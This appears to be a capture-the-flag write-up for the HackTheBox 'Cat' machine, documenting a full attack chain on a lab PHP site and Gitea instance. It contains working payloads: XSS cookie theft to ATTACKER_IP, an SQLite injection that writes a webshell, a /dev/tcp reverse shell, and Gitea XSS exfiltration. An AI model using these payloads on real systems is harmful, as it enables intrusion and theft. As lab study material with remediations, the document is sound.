# HackTheBox - Cat (Medium)

**OS:** Linux
**Difficulty:** Medium
**Techniques:** Stored XSS (filter bypass), Cookie Hijacking, SQL Injection (SQLite → RCE via `ATTACH DATABASE`), Gitea Stored XSS (CVE-2024-6886), Password Reuse / Plaintext Credential Leakage

---

## Summary

Cat is a custom PHP web application for a cat-themed contest site. The application allows
users to register and submit cat photos for a contest. A blacklist-based input filter blocks
most XSS metacharacters in the `cat_name` field, but does not block the double-quote character,
and the field is echoed unescaped inside an HTML attribute. By injecting an HTML
attribute-breakout payload into `cat_name` (with the JavaScript payload hex-encoded to dodge
the remaining blacklisted characters), we achieve a stored XSS that fires when an administrator
(`axel`) reviews a submission. We use this to hijack the admin's session cookie, gain access to
an admin-only feature that is vulnerable to SQL injection, and use SQLite's `ATTACH DATABASE`
to write a PHP webshell to disk, achieving RCE as `www-data`. Because the application's login
is implemented via GET (not POST), harvested credentials for `axel` in Apache's `access.log`
(readable by user `rosa`, group `adm`) allow lateral movement first to `rosa`, then to `axel`
via `su`. On the box, `axel` has access to a locally-hosted Gitea instance (port 3000)
vulnerable to CVE-2024-6886 (stored XSS via repository description). By reading local mail, we
learn of a private repository owned by
`administrator` containing employee-management credentials. Chaining the Gitea XSS with an
email to trigger review by an internal user (`jobert`), we exfiltrate the private repo's
`index.php`, which contains a plaintext password that grants **root**.

---

## 1. Reconnaissance

### 1.1 Directory / content discovery

```bash
gobuster dir -u http://cat.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 50
```

Notable results:

```
/admin.php            (Status: 302) [--> /join.php]
/config.php           (Status: 200) [Size: 1]
/contest.php          (Status: 302) [--> /join.php]
/.git/HEAD             (Status: 200) [Size: 23]
/join.php             (Status: 200)
/logout.php           (Status: 302) [--> /]
/uploads               (Status: 301) [--> /uploads/]
/vote.php             (Status: 200)
```

The most important finding: **`/.git/HEAD` returns 200** - the `.git` directory is exposed,
allowing us to dump the entire source tree and commit history.

### 1.2 Dumping the exposed Git repository

```bash
pip3 install git-dumper
git-dumper http://cat.htb/.git/ ./cat-git-dump
cd cat-git-dump
git log --all
```

This gives full source access to `contest.php`, `admin.php`, `view_cat.php`, `accept_cat.php`,
`join.php`, and `config.php` - critical for identifying the vulnerabilities below without any
black-box guessing.

---

## 2. Source Code Review - Finding the XSS

### 2.1 The input filter (`contest.php`)

The blacklist blocks `+ * { } ' , ; < > ( ) [ ] / :` - but notably **not** the double-quote
character (`"`), which turns out to be the important gap (see Section 3).

Separately, while reviewing the upload handling, we also noted that **the uploaded file's name
is never checked against this filter at all**:

```php
$target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
```

`basename()` only strips path components (e.g. `../../etc/passwd` → `passwd`); it does **not**
strip HTML metacharacters. The only other validations on the upload are:

- `getimagesize()` - must return valid image dimensions (checks *magic bytes*, not full file
  integrity)
- File must not already exist
- File must be ≤ 500,000 bytes
- Extension (from `pathinfo()`, i.e. everything after the **last** dot) must be `jpg`, `jpeg`,
  or `png`

This looked like the more obvious injection point at first glance, and was the first thing we
tried - but as covered in Section 3.1, it turned out to be a dead end in practice. The filter
gap that actually mattered was the missing `"` in the `cat_name` blacklist above.

### 2.2 The vulnerable sink (`view_cat.php`)

`admin.php` (the list of pending submissions) correctly escapes all output with
`htmlspecialchars()` - **not exploitable**. However, `view_cat.php` (reached by clicking
"View" on a submission) does **not** escape anything:

```php
<h1>Cat Details: <?php echo $cat['cat_name']; ?></h1>
<img src="<?php echo $cat['photo_path']; ?>" alt="<?php echo $cat['cat_name']; ?>" class="cat-photo">
<div class="cat-info">
    <strong>Name:</strong> <?php echo $cat['cat_name']; ?><br>
    ...
```

Both `photo_path` (derived from the unfiltered filename) **and** `cat_name` are echoed raw
here. This gives two theoretically viable injection points into the same `<img>` tag: the
`src` attribute (via `filename`) and the `alt` attribute (via `cat_name`).

---

## 3. Exploitation - Stored XSS via `cat_name` (Attribute Breakout)

### 3.1 First attempt: filename - abandoned

The filename is never checked against `$forbidden_patterns`, so it initially looked like the
more promising route. However, in practice this path ran into two dead ends:

- Sending a raw `<img src=x onerror=...>` (or any payload containing literal `<`, `>`, and
  embedded double quotes) inside the `filename="..."` multipart header consistently returned
  **HTTP 500 with an empty body** - most likely a WAF/mod_security rule intercepting the
  request, or the malformed multipart parsing that results from embedding unescaped quotes
  inside an already-quoted `filename` value.
- Even when the request otherwise succeeded, correctly terminating the filename with `.png` /
  `.jpg` (required to pass the extension check) while also closing out an attribute-breakout
  payload proved awkward, since PHP's multipart parser reads *everything between the first and
  last quote* on that header line as the filename value.

This path was abandoned in favor of `cat_name`, below.

### 3.2 Working payload: `cat_name` (breaking out of the `alt` attribute)

`cat_name` **is** filtered by the blacklist:

```php
$forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";
```

- blocking `<`, `>`, `(`, `)`, `;`, `'`, and a handful of others. Critically, **the double
quote character `"` is not on the blacklist**, and the field is not run through
`htmlspecialchars()` on output (see 2.2). Since `cat_name` lands inside `alt="..."`, we don't
need to build a brand-new tag - we can break out of the existing `alt` attribute and add our
own `onerror` handler to the *same* `<img>` tag:

```
x" onerror="PAYLOAD" x="
```

Two extra constraints, both satisfied by design:

- `(` `)` `;` are blacklisted and would otherwise appear in a `fetch(...)` call inside
  `PAYLOAD` - solved by hex-HTML-entity-encoding the JavaScript (see 3.3), so the raw HTTP
  request never contains those characters; the browser decodes the entities back into
  executable JS at render time.
- The trailing `x="` re-opens and immediately closes a harmless dummy attribute, so the rest of
  the original tag (`class="cat-photo"`, and the `alt` attribute's own closing quote) parses
  cleanly instead of breaking the surrounding HTML.

JavaScript payload (raw):
```javascript
fetch('http://ATTACKER_IP:8000/?cookie=' + document.cookie)
```

### 3.3 Encoding the payload

To keep the raw HTTP request free of any blacklisted character (`(` `)` `;`), the JS payload is
hex-HTML-entity encoded so the browser decodes it back to executable JS at render time:

```python
#!/usr/bin/python3
import sys

if len(sys.argv) != 2:
    print(f'[!] Usage: {sys.argv[0]} <payload>')
    sys.exit(1)

string = sys.argv[1]

def Encoding(string):
    output = ''
    for character in string:
        output += '&#x' + hex(ord(character))[2:]
    return output

if __name__ == '__main__':
    print(Encoding(string))
```

```bash
python3 encode.py "fetch('http://ATTACKER_IP:8000/?cookie=' + document.cookie)"
```

### 3.4 Delivering the payload

The submitted "cat photo" must still pass `getimagesize()`, so it needs valid magic bytes but
can otherwise be corrupted:

```bash
python3 -c "
with open('/tmp/evil.png', 'wb') as f:
    f.write(b'\x89PNG\r\n\x1a\n')
    f.write(b'corrupted_data_here_to_break_rendering')
"
```

Full request (via `curl`, avoids binary-encoding issues in tools like Burp's raw text view):

```bash
curl -i -X POST http://cat.htb/contest.php \
  -H "Cookie: PHPSESSID=<your_session>" \
  -F 'cat_name=x" onerror="<HEX_ENCODED_PAYLOAD>" x="' \
  -F 'age=1' \
  -F 'birthdate=0001-01-01' \
  -F 'weight=1' \
  -F 'cat_photo=@/tmp/evil.png;type=image/png'
```

Start a listener before sending:

```bash
python3 -m http.server 8000
```

### 3.5 Capturing the cookie

The application description states an administrator periodically reviews submissions. After
submitting the crafted entry and waiting, the listener receives:

```
X.X.X.X - - [.../...] "GET /?cookie=PHPSESSID=<admin_session_id> HTTP/1.1" 200 -
```

Swap your own `PHPSESSID` cookie for the captured one to authenticate as `axel` (the admin
user) on the web application.

---

## 4. SQL Injection → RCE (SQLite `ATTACH DATABASE`)

### 4.1 Source review (`accept_cat.php`)

The admin-only "Accept" action is reachable only with `$_SESSION['username'] === 'axel'`:

```php
$cat_name = $_POST['catName'];
$catId = $_POST['catId'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
$stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
$stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
$stmt_delete->execute();
```

`catId` is safely parameterized. `catName` is concatenated directly into an `INSERT` with
**no** prepared statement - classic SQL injection. The backend database is **SQLite**.

### 4.2 Confirming stacked queries

```bash
curl -s -X POST http://cat.htb/accept_cat.php \
  -H "Cookie: PHPSESSID=<hijacked_admin_session>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "catName=test'); SELECT 1;--" \
  --data "catId=998"
```
→ `"The cat has been accepted and added successfully."` confirms PDO's SQLite driver allows
stacked (multi-statement) queries via `exec()`.

### 4.3 Locating the writable web root

The webroot is **not** `/var/www/html/` on this box - confirmed by testing several paths via
`ATTACH DATABASE`:

```bash
curl -s -X POST http://cat.htb/accept_cat.php \
  -H "Cookie: PHPSESSID=<hijacked_admin_session>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "catName=test'); ATTACH DATABASE '/var/www/cat.htb/uploads/shell.php' AS pwn;--" \
  --data "catId=994"
```
→ success. The correct webroot is **`/var/www/cat.htb/`**.

### 4.4 Writing the webshell

SQLite's `ATTACH DATABASE` lets us create a new database file at an arbitrary path. Since PHP
executes any `<?php ... ?>` block it finds regardless of surrounding binary garbage, we attach
a new "database" at a `.php` path inside the web root, then `INSERT` PHP code as data:

```bash
curl -s -X POST http://cat.htb/accept_cat.php \
  -H "Cookie: PHPSESSID=<hijacked_admin_session>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "catName=test'); ATTACH DATABASE '/var/www/cat.htb/uploads/shell.php' AS pwn; CREATE TABLE pwn.pwn (data text); INSERT INTO pwn.pwn (data) VALUES ('<?php system(\$_GET[\"cmd\"]); ?>');--" \
  --data "catId=991"
```

Verify:

```bash
curl "http://cat.htb/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.5 Upgrading to a reverse shell

```bash
nc -lvnp 4444
```
```bash
curl "http://cat.htb/uploads/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/ATTACKER_IP/4444+0%3E%261%27"
```

Foothold obtained as `www-data`.

---

## 5. Lateral Movement - `www-data` → `rosa` → `axel`

### 5.1 The insecure GET-based login

Watching login traffic (Burp / browser network tab) against `join.php` shows that
authentication is performed via a **GET** request, not POST:

```
GET /join.php?loginUsername=axel&loginPassword=...&loginForm=Login HTTP/1.1
```

Because credentials travel as URL query parameters, they are written in **plaintext** to
Apache's `access.log` on every login (a classic GET-vs-POST security pitfall - GET request URLs
are logged by servers/proxies, cached, stored in browser history, and leaked via the `Referer`
header).

`www-data` cannot read `/var/log/apache2/` (no `adm` group membership), so this alone doesn't
help yet - we first need a local user account that can read the logs.

### 5.2 Dumping database credentials via `sqlmap`

Before writing the webshell, the same `accept_cat.php` injection point was also explored with
`sqlmap` to enumerate and dump the database automatically. Since the endpoint's response
differs based on whether the injected SQL is syntactically valid (`"successfully"` vs. an empty
`500` response), this behaves as a boolean-based blind injection from `sqlmap`'s perspective:

```bash
sqlmap -r req.txt --batch --dbms=sqlite --technique=B --level=5 --risk=3 \
  --string="successfully" -p catName --dump-all
```

Where `req.txt` is a raw HTTP request file for `POST /accept_cat.php`, with the hijacked admin
session cookie and a `*` marking the injection point in `catName`.

This dumps the `users` table (11 accounts, MD5 password hashes). The hashes are cracked
offline with Hashcat/John against `rockyou.txt`:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt --show
```

This cracks `rosa`'s hash to the plaintext password **`soyunaprincesarosa`**. `axel`'s hash
does not crack against `rockyou.txt` - his credentials are recovered separately below, from the
Apache access log.

### 5.3 `rosa` → reading Apache logs → `axel`'s plaintext password

With `rosa`'s cracked password, we log in as her (e.g. `su rosa`, or over SSH once a shell is
available). `rosa` is a member of the `adm` group, granting read access to Apache logs, which
lets us finally confirm the GET-based login leak suspected in 5.1:

```bash
grep 'axel' /var/log/apache2/access.log
```
```
127.0.0.1 - - [.../...] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 ...
```

The plaintext password for `axel` is now known: **`aNdZwgC4tI9gnVXv_e3Q`**.

```bash
su axel
# Password: aNdZwgC4tI9gnVXv_e3Q
```

```bash
cat /home/axel/user.txt
```

**User flag obtained.**

---

## 6. Privilege Escalation - Gitea Stored XSS (CVE-2024-6886) → Root

### 6.1 Reading local mail

```bash
cat /var/mail/axel
```

Two internal emails from `rosa@cat.htb` reveal:

1. Axel is asked to email `jobert@localhost` with details about his Gitea repository so it can
   be reviewed.
2. A private repository exists under the `administrator` Gitea account:
   `http://localhost:3000/administrator/Employee-management/`, specifically calling out its
   `README.md`.

### 6.2 Accessing Gitea

Port 3000 is bound to loopback only. Forward it over SSH using `axel`'s credentials:

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

Browsing `http://127.0.0.1:3000` shows the Gitea footer: **Powered by Gitea, Version: 1.22.0**
- a version affected by:

> **CVE-2024-6886** - Stored XSS in Gitea 1.22.0. The repository **Description** field on the
> `$username/$repo_name/settings` page is not properly sanitized. A payload such as
> `<a href=javascript:alert()>XSS test</a>` executes when the description is clicked by any
> user viewing the repository.

`axel`'s web-application password is reused for Gitea login (and for SSH), confirming
widespread credential reuse across this box.

### 6.3 Weaponizing the XSS

1. Create a new repository as `axel` (e.g. `cat-care-app`) and commit at least one file (an
   empty repo shows Gitea's "Quick Guide" screen instead of the normal repo view, hiding the
   description).
2. Go to **Settings → Description** and set:

```html
<a href="javascript:var req = new XMLHttpRequest();
req.open('GET','http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md',false);
req.send();
var response = req.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET','http://ATTACKER_IP:8000/?content=' + btoa(response), true);
req2.send();">Click</a>
```

3. Start a listener: `python3 -m http.server 8000`.
4. Trigger a review by emailing `jobert`, exactly as instructed in axel's mail:

```bash
echo http://localhost:3000/axel/cat-care-app | sendmail jobert
```

### 6.4 Exfiltrating the private repository

The first attempt targets `readme.md` (lowercase, as referenced in axel's email) and comes back
decoded as `Not found.` - the file doesn't exist under that name/path. Pivoting to guess that
this is a small PHP application (consistent with the rest of the box), we retarget the same
payload at `index.php` instead, which succeeds:

```html
<a href="javascript:var req = new XMLHttpRequest();
req.open('GET','http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php',false);
req.send();
var response = req.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET','http://ATTACKER_IP:8000/?content=' + btoa(response), true);
req2.send();">Click</a>
```

Listener output:

```
X.X.X.X - - [.../...] "GET /?content=PD9waHAK...(base64)... HTTP/1.1" 200 -
```

```bash
echo "PD9waHAK...(base64)..." | base64 -d
```

```php
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {

    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

A plaintext password is embedded directly in the source: **`IKw75eR0MR7CMIxhH0`**.

### 6.5 Root

Password reuse strikes again - this credential is valid for the **root** system account:

```bash
su root
# Password: IKw75eR0MR7CMIxhH0
```

```bash
cd
cat root.txt
```

**Root flag obtained.**

---

## 7. Key Takeaways

| Weakness | Impact |
|---|---|
| Blacklist filter omits the double-quote character, and output is not HTML-escaped | Enabled a stored XSS attribute-breakout via `cat_name` despite the filter |
| `view_cat.php` echoes DB fields without `htmlspecialchars()` (unlike `admin.php`) | XSS sink for the admin session |
| Login implemented via GET | Plaintext credentials leaked into Apache access logs |
| `www-data` cannot read Apache logs, but a low-priv user (`rosa`) can (`adm` group) | Standard privilege boundary, but combined with password reuse this becomes exploitable |
| String concatenation instead of prepared statements in `accept_cat.php` | SQL injection |
| SQLite `ATTACH DATABASE` reachable from injectable `exec()` | Full RCE by writing a PHP webshell to the web root |
| Outdated Gitea 1.22.0 (CVE-2024-6886) | Stored XSS in repo description, exploited via an internal "review" workflow to reach a private repo |
| Password reuse across services and privilege tiers | A single leaked credential cascaded into full system compromise |

**Remediations:**
- Sanitize *all* user-controlled output, including filenames, consistently across every page
  that renders them (`htmlspecialchars()` everywhere, not just in `admin.php`).
- Never transmit credentials via GET; always use POST over HTTPS.
- Use parameterized queries/prepared statements for *all* SQL, with no exceptions.
- Keep third-party software (Gitea) patched - 1.22.0 was outdated at time of engagement, and
  the XSS fix shipped in 1.22.1.
- Eliminate credential/password reuse across services and privilege tiers.
